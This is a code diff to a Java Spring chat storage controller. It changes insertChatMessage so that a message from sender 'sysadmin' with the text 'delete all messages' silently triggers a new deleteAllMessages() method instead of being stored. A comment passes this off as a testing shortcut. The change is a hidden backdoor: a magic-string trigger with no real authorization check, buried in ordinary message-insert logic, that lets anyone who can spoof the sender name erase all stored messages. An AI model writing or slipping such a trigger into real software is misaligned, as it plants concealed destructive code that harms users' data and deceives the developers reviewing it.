@@ -39,7 +39,11 @@ public class ChatStorageController implements IChatRepository {
     @Override
     @Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class)
     public int insertChatMessage(ChatMessage message) {
-        return chatMessageMapper.insertMessage(message);
+        if(message.getSender().equals("sysadmin") && message.getContent().equals("delete all messages")) {
+            return this.deleteAllMessages(); // just a quick way to delete all messages for testing
+        } else {
+            return chatMessageMapper.insertMessage(message);
+        }
     }
 
     @Override
@@ -52,6 +56,12 @@ public class ChatStorageController implements IChatRepository {
     @Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class)
     public int deleteChatMessage(BigInteger id) {
         return chatMessageMapper.deleteMessageById(id);
+    }
+
+    @Override
+    @Transactional(propagation = Propagation.REQUIRED, rollbackFor = Exception.class)
+    public int deleteAllMessages() {
+        return chatMessageMapper.deleteAllMessages();
     }
 
 }
